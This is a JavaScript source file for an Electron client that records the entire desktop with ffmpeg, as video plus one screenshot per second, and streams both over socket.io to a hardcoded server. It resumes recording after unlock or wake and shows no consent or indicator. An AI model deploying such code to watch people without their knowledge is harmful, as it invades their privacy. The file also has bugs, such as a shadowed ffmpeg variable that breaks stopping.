const express = require("express");
const { spawn, exec } = require("child_process");
const http = require("http");
const socketIo = require("socket.io-client");
const os = require("os");
const { app, screen, powerMonitor } = require("electron");

const appli = express();
const server = http.createServer(appli);
let ffmpeg; 
let io;
const PORT = 9000;
const serveurBackend = "http://192.168.1.161:4000";

let idClient = "67e3e55407150101df7a26e9";

const helper = require("./helper/helper");
let fileName = helper.generateFileName(idClient);
let dateFolder = helper.generateDate();
let isConnected = true;
let resolution = "1280x720"; 

function startCapture() {
  const platform = os.platform();

  if (platform == "win32") {
    const capture = "gdigrab"; 
    const fps = "25"; 
    const captureOs = "desktop"; 
    const qualite = "31"; 
    const format = "mp4"; 

    
    var ffmpeg = spawn("ffmpeg", [
      "-f", capture,
      "-r", fps.toString(),
      "-s", resolution,
      "-i", captureOs,
      "-q:v", qualite.toString(),
      "-c:v", "libx264",
      "-preset", "veryfast",
      "-crf", "23",
      "-pix_fmt", "yuv420p",
      "-movflags", "frag_keyframe+empty_moov",
      "-f", format,
      "pipe:1",
    ]);
    var ffmpegImg = spawn("ffmpeg", [
      "-f", "gdigrab",                 
      "-framerate", "1",               
      "-video_size", resolution,       
      "-i", "desktop",                 
      "-vf", "fps=1/1",                
      "-vcodec", "libwebp",            
      "-lossless", "0",                
      "-q:v", "10",                    
      "-f", "image2pipe",              
      "pipe:1"
    ]);
  }
  if (platform == "linux") {
    const capture = "x11grab";
    const fps = "25";
    const captureOs = ":0.0";
    const qualite = "31";
    const format = "mp4";
    var ffmpeg = spawn("ffmpeg", [
      "-f",capture, 
      "-r",fps, 
      "-s",resolution, 
      "-i",captureOs, 
      "-q:v",qualite, 
      "-c:v","libx264",
      "-preset","veryfast",
      "-crf","23",
      "-pix_fmt","yuv420p",
      "-movflags","frag_keyframe+empty_moov",
      "-f",format, 
      "pipe:1", 
    ]);
   
    var ffmpegImg = spawn("ffmpeg", [
      "-f", "x11grab",
      "-video_size", resolution,
      "-i", ":0.0",
      "-vf", "fps=1/1",  
      "-vcodec", "libwebp",
      "-lossless", "0",  
      "-q:v", "10",      
      "-f", "image2pipe",
      "pipe:1"
    ]);
  }
  ffmpegImg.stdout.on("data", (data) => {
    io.emit("test", { data, client: idClient });   
  });
  ffmpeg.stdout.on("data", (data) => {
    if (io) io.emit("video", { data, client: idClient, fileName: fileName });
  });
}


function stopCapture() {
  if (ffmpeg) {
    ffmpeg.kill("SIGTERM");
    ffmpeg = null;
  }
}


function restartCapture() {
  fileName = helper.generateFileName(idClient);
  io.emit("sendVideo", {
    client: idClient,
    fileName: fileName,
    dateFolder: dateFolder,
  });
  startCapture();
}



app.whenReady().then(() => {
  const displays = screen.getAllDisplays();
  let totalWidth = 0,
    totalHeight = 0;

  displays.forEach((display) => {
    totalWidth += display.bounds.width;
    totalHeight = Math.max(totalHeight, display.bounds.height);
  });

  resolution = `${totalWidth}x${totalHeight}`;

  io = socketIo(serveurBackend);
  io.on("connect", () => {
    io.emit("sendVideo", {
      client: idClient,
      fileName: fileName,
      dateFolder: dateFolder,
    });
  });

  startCapture(); 

  server.listen(PORT, () => {
    console.log("serveur running on port " + PORT);
  });
});


function checkConnection() {
  exec("ping -c 1 google.com", (error) => {
    if (error) {
      if (isConnected) {
        isConnected = false;
      }
    } else {
      if (!isConnected) {
        isConnected = true;
        startCapture();
      }
    }
  });
}

powerMonitor.on("suspend", () => {
  stopCapture();
});

powerMonitor.on("resume", () => {
  restartCapture();
});

powerMonitor.on("lock-screen", () => {
  stopCapture();
});

powerMonitor.on("unlock-screen", () => {
  restartCapture();
});

setInterval(checkConnection, 5000);
